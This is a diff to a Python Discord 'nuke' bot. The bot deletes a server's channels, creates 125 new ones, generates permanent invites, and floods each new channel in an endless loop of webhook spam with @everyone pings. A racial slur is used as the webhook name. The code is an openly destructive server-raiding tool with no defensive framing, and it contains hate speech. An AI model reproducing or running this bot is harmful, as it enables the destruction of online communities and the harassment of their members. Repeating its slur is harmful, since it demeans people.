@@ -15,7 +15,7 @@ https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966
 https://discord.gg/rdXHweYQ7f
 ||@everyone||
 """]
-webhook = "NIGGERED BY THE GUARD"
+webhook2 = "NIGGERED BY THE GUARD"
 
 intents = discord.Intents.all()
 client = commands.Bot(command_prefix = ">", intents=intents)
@@ -42,7 +42,7 @@ async def nuke(ctx):
         except:
             print("DELETING CHANNELS: FAILED")
     for _i in range(125):
-        await ctx.guild.create_text_channel(name=(random.choice(channel)))
+        await ctx.guild.create_text_channel(name=random.choice(channel))
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invitation: {link}")
@@ -53,10 +53,10 @@ async def nuke(ctx):
 
 @client.event
 async def on_guild_channel_create(channel):
-  webhook = await channel.create_webhook(name=random.choice(webhook))
+  webhook = await channel.create_webhook(name=random.choice(webhook2))
   while True:
     await channel.send(random.choice(spam))
     await webhook.send(random.choice(spam),
-                           username=random.choice(webhook))  
+                           username=random.choice(webhook2))  
 
 client.run(TOKEN)
